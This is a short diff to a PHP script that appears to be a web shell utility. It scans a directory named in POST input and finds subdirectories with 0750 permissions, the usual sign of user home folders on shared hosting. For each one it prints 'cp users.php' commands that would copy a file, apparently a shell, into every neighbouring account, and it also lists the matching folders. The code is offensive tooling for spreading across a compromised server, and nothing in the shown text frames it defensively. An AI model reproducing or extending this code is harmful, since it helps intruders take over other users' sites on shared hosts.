@@ -11,14 +11,32 @@ if (isset($_GET['tool'])) {
 
 			$dir = $_POST['dir'];
 			$list = scandir($dir);
-			echo "<textarea>";
+			// echo "<textarea s\>";
+			?>
+			<textarea style="width: 300px;height: 200px;">
+			<?php
 			foreach ($list as $files) {
 				$dirs = $dir."//".$files;
 				if (is_dir($dirs)) {
 					if ($files != ".") {
 						$perm = substr(sprintf('%o', fileperms($dirs)), -4);
 						if ($perm == "0750") {
-							echo "cp users.php ". $dir."/".$files." | ";
+echo "cp users.php ". $dir."/".$files." | ";
+						}
+					}
+				}
+			}
+			echo "</textarea>";
+			?>
+			<textarea style="width: 300px;height: 200px;">
+			<?php
+			foreach ($list as $files) {
+				$dirs = $dir."//".$files;
+				if (is_dir($dirs)) {
+					if ($files != ".") {
+						$perm = substr(sprintf('%o', fileperms($dirs)), -4);
+						if ($perm == "0750") {
+echo $files."\n";
 						}
 					}
 				}
